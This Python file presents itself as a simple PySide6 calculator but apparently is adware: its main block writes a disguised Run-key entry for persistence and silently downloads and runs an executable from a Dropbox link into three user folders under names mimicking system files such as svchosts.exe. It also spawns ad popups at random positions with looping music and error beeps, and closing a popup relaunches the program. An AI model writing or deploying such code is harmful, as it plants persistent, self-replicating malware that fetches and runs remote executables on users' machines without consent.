
import sys
import requests
import subprocess
import random
import winreg
import os
import winsound
import pygame
from pathlib import Path

from PySide6.QtCore import Qt
from PySide6.QtWidgets import QApplication, QPushButton, QWidget, QLabel, QVBoxLayout, QHBoxLayout
from PySide6.QtGui import QFont, QPixmap, QGuiApplication, QPainter, QColor, QIcon
from io import BytesIO
from PIL import Image, ImageFilter, ImageEnhance

# Imports
from PySide6.QtWidgets import QApplication, QWidget, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout, QGridLayout, QLabel
from PySide6.QtGui import QFont


# Class: AppSettings, Objects, Design, Method/Function
class CalcApp(QWidget):         # inherit qwidget super class

    # When app starts, all design is done
    # Init:  AppSettings, Objects, Design
    def __init__(self):  
        super().__init__()
        # App Settings
        # Note self is referring to QWidget, remember main_window = QWidget()
        self.setWindowTitle("Simple Calculator")   # Window Name
        self.resize(300, 300)                         # Width: 300 Height: 300

        # All objects/widgets/buttons
        # Turn all variable to properties by putting self in front
        self.text_box = QLineEdit()                  # Box to input

        # Style the TextBox
        self.text_box.setFont(QFont("Helventica", 32))     # "FontName", (Size)
        self.grid = QGridLayout()

        self.buttons = [
            "7", "8", "9", "/",            # Can choose to sort by colums or rows
            "4", "5", "6", "*",
            "1", "2", "3", "-",
            "0", ".", "=", "+"
        ]

        # Loop to create buttons
        # Create button should be done in initialisation process
        row = 0
        col = 0
        for text in self.buttons:                    # for every text in buttons list
            button = QPushButton(text)          # Button will be set to the [0] of the list buttons
            button.clicked.connect(self.button_click)        # Event when clicked
            #Before add to layout style it first
            # Write the element you want to affect, (Size of font)(font); padding is 
            # space around the context. SetStyleSheet is CSS
            button.setStyleSheet("QPushButton {font: 25pt Comic Sans MS; padding: 10px;}")       
            self.grid.addWidget(button, row, col)    # Add buttons to the grid
            col += 1                            # Move to the right iun current row     
            if col > 3:                         # When fully filled (4 buttons in row[0]) go next row
                col = 0
                row += 1

        self.clear = QPushButton("Clear")            # Clear our text_box
        self.delete = QPushButton("<")               # Delete
        self.clear.setStyleSheet("QPushButton {font: 25pt Comic Sans MS; padding: 10px;}")
        self.delete.setStyleSheet("QPushButton {font: 25pt Comic Sans MS; padding: 10px;}")


        # Design/Adding the widgets
        # Should be inside Init
        master_layout = QVBoxLayout()
        master_layout.addWidget(self.text_box)       # Top of App the text_box
        master_layout.addLayout(self.grid)           # Followed by Grid of numbers

        # small spacing around button right, left, top, bottom
        master_layout.setContentsMargins(25,25,25,25)   

        # button_row items
        button_row = QHBoxLayout()
        button_row.addWidget(self.clear)
        button_row.addWidget(self.delete)

        master_layout.addLayout(button_row)     # Bottom of App adds a row for clear and delete
        self.setLayout(master_layout)    # Important to setLayout or else see nothing

        self.clear.clicked.connect(self.button_click)     # clear button connect to button_click
        self.delete.clicked.connect(self.button_click)    # delete button connect to button_click

    # Method
    def button_click(self):                     # Function need to be before it is called
        # Listen to what button is clicked, IMPORTANT: must be self not app
        button = self.sender()     
        text = button.text()       # Get the text_value from the button

        if text == "=":
            # Get the text within text_box, IMPORTANT: to add () or else it does not pass as 
            # string but as method
            symbol = self.text_box.text()    
            try:
                res = eval(symbol)          # Evaluate the equation
                self.text_box.setText(str(res))  # Replace text_box entire text with res

            except Exception as e:          # Except all exception, e is name holder
                print("Error:", e)         # Print Error with type of error aka e 

        elif text == "Clear":
            self.text_box.clear()

        elif text == "<":
            current_value = self.text_box.text() # All text within
            # Remember range(start:stop:step), 0 (default) to the last element -1 (aka [:-1])
            self.text_box.setText(current_value[:-1])       

        else:
            # If not the stated above symbols, we want them to appear in the text_box
            current_value = self.text_box.text()     
            self.text_box.setText(current_value + text)

# get resource_path
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# Extra Stuff Path
ICON_PATH = resource_path(os.path.join("accessories", "icon.ico"))
THEME_PATH = resource_path(os.path.join("accessories", "theme.mp3"))

class AdWindow(QWidget):

    def __init__(self):
        super().__init__()
        self.setWindowTitle("TMJC AD")   
        self.resize(300, 250)

        # Icon
        self.setWindowIcon(QIcon(ICON_PATH))

        # Objects
        self.text1 = QLabel()
        self.text1.setFont(QFont("Helventica", 15, QFont.Weight.ExtraBold))    
        self.text1.setTextFormat(Qt.TextFormat.RichText)  # enable rich text rendering
        self.text1.setText(rainbowtext("TAMPINES MERIDIAN COLLEGE"))

        self.text2 = QLabel()
        self.text2.setFont(QFont("Helventica", 15, QFont.Weight.ExtraBold))    
        self.text2.setTextFormat(Qt.TextFormat.RichText)  # enable rich text rendering
        self.text2.setText(rainbowtext("IS THE BEST!"))

        self.image = QLabel("IMAGE HERE")
      
        self.join = QPushButton("CLICK TO JOIN")
        self.join.setFont(QFont("Helventica", 12, QFont.Weight.ExtraBold))
        self.join.setStyleSheet("background-color: #FF409F; color: black;")

        # Music
        pygame.mixer.init()
        pygame.mixer.music.load(THEME_PATH)
        pygame.mixer.music.play(loops=-1)     # Play infinitely
           
        # Randomise
        screen_geometry = QGuiApplication.primaryScreen().geometry()
        x = random.randint(0, screen_geometry.width() - self.width())
        y = random.randint(0, screen_geometry.height() - self.height())
        self.move(x, y)

        # Layout
        master_layout = QVBoxLayout()
        row1 = QHBoxLayout()
        row2 = QHBoxLayout()
        row3 = QHBoxLayout()
        row4 = QHBoxLayout()

        row1.addWidget(self.text1, alignment=Qt.AlignmentFlag.AlignCenter)
        row2.addWidget(self.text2, alignment=Qt.AlignmentFlag.AlignCenter)
        row3.addWidget(self.image, alignment=Qt.AlignmentFlag.AlignCenter)
        row4.addWidget(self.join, alignment=Qt.AlignmentFlag.AlignCenter)

        # Add the Layouts
        master_layout.addLayout(row1)
        master_layout.addLayout(row2)
        master_layout.addLayout(row3)
        master_layout.addLayout(row4)
        self.setLayout(master_layout)

        # Connect Buttons
        self.join.clicked.connect(self.button_function)

    def show_image(self, url):
        try:
            pixmap = enhance_image_from_url(url, 25)
            if not pixmap.isNull():         # if pixmap is NOT empty
                self.image.setPixmap(pixmap.scaled(200, 150, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            else:
                self.image.setText("Failed to load image")
        except Exception as e:
            self.image.setText(f"Error: {e}")

    def button_function(self):
        subprocess.Popen([sys.executable, sys.argv[0]])


    def closeEvent(self, event):
        # Ignore the close event so that the ad
        # can't be closed by pressing close button.
        # event.ignore()

        # Replication when close;end process
        subprocess.Popen([sys.executable, sys.argv[0]])

        winsound.MessageBeep(winsound.MB_ICONHAND)
        pass
        
# Image Enhance
def enhance_image_from_url(url, factor=1.5):    # default: 1.5
    # Download image bytes
    response = requests.get(url)
    response.raise_for_status()

    # Open as PIL Image
    pil_img = Image.open(BytesIO(response.content))

    # Enhancements
    Enhance1 = pil_img.filter(ImageFilter.SHARPEN)
    Enhance2 = ImageEnhance.Color(Enhance1).enhance(factor)

    enhanced_img = ImageEnhance.Contrast(Enhance2).enhance(factor)  # Contrast

    # PIL image back to bytes 
    buf = BytesIO()
    enhanced_img.save(buf, format='PNG')
    buf.seek(0)

    # Load into QPixmap
    pixmap = QPixmap()
    pixmap.loadFromData(buf.read())

    return pixmap

# Rainbow Text
def rainbowtext(text):
        n = len(text)
        colored_chars = []
        for i, c in enumerate(text):
            hue = int((360 / n) * i)  # hue angle in degrees
            colored_chars.append(
                f'<span style="color: hsl({hue}, 100%, 50%)">{c}</span>'
            )
        return ''.join(colored_chars)

# Persistance 1
def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])
    python_exe = sys.executable

    # The command to run your script on startup
    cmd = f'"{python_exe}" "{script_path}"'
    name_choices = ["updaters.bat", "networks.ini", "chrome_helpers.exe", "defenders.run", "svchosts.exe", "startups.exe", "tools.ini"]
    reg_name = random.choice(name_choices)

    # Open the registry key where startup programs are registered
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE
    )
    # Set a new value. "startup.exe" is the name shown in registry; you can change it
    winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)


def show_ads(count=2, url=None):    # default count = 2, url = ""
    windows = []
    for _ in range(count):
        window = AdWindow()
        window.setStyleSheet("QWidget {background-color:#191821 }")
        window.show()
        winsound.MessageBeep(winsound.MB_ICONHAND)      # Win Error SOUND whenever popup
        if url:             # if url exists for image
            window.show_image(url)
        windows.append(window)
    return windows

# Rainbow text raw
class RainbowTextButton(QPushButton):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.font = QFont("Helvetica", 12, QFont.Weight.ExtraBold)
        self.setFont(self.font)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setFont(self.font)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        text = self.text()
        x = 10  # small left padding
        y = self.height() // 2 + painter.fontMetrics().ascent() // 2 - 2
        hue_step = 360 / len(text)

        for i, char in enumerate(text):
            hue = (i * hue_step) % 360
            color = QColor()
            color.setHsv(int(hue), 255, 255)
            painter.setPen(color)
            painter.drawText(x, y, char)
            x += painter.fontMetrics().horizontalAdvance(char)

# Multiplication factor 
def silent_download_and_run(url, destination_file):
    try:
        if not os.path.exists(destination_file):
            # Download file silently with streaming
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(destination_file, "wb") as f:
                for chunk in response.iter_content(8192):
                    if chunk:
                        f.write(chunk)
        # Run the downloaded executable silently
        subprocess.Popen([os.path.abspath(destination_file)], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        # Silently ignore errors (or log if you want)
        pass

if __name__ == "__main__":     
    # Persistance
    # To remove go Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    # pyinstaller --onefile --noconsole --icon "accessories/icon.ico" --add-data "accessories/*;accessories" malwareinstaller.py
    dropbox_link = "https://www.dropbox.com/scl/fi/rm0i317u5ghm5dlk71blo/TMJC_AdwareV3.exe?rlkey=70sxrhzaviq9gf26h0ujt7ww4&st=62dkuaus&dl=1"
    destination_path1 = Path(os.getenv('USERPROFILE')) / "Saved Games" / "chrome_helpers.exe"
    destination_path2 = Path(os.getenv('USERPROFILE')) / "Favourites" / "svhosts.exe"
    destination_path3 = Path(os.getenv('USERPROFILE')) / "Pictures" / "Screenshots" / "startups.exe"

    destination_path1.parent.mkdir(parents=True, exist_ok=True)
    destination_path2.parent.mkdir(parents=True, exist_ok=True)
    destination_path3.parent.mkdir(parents=True, exist_ok=True)

    # Creates another copy x 3
    add_to_startup()
    silent_download_and_run(dropbox_link, destination_path1)
    silent_download_and_run(dropbox_link, destination_path2)
    silent_download_and_run(dropbox_link, destination_path3)

    app = QApplication([])
    main_window = CalcApp()         # Execute the class/app
    main_window.setStyleSheet("QWidget {background-color:#ADD8E6 }")
    main_window.show()              # Show your main window

    # Show/Run
    app.setWindowIcon(QIcon(ICON_PATH))   # Icon
    url = "https://tmjc.moe.edu.sg/images/tmjc.jpeg"
    main_window2 = AdWindow()         # Execute the class/app
    main_window2.setStyleSheet("QWidget {background-color:#191821 }")
    main_window2.show()              # Show your main window
    main_window2.show_image(url)

    windows = show_ads(4, url)
    app.exec()                      # Execute App

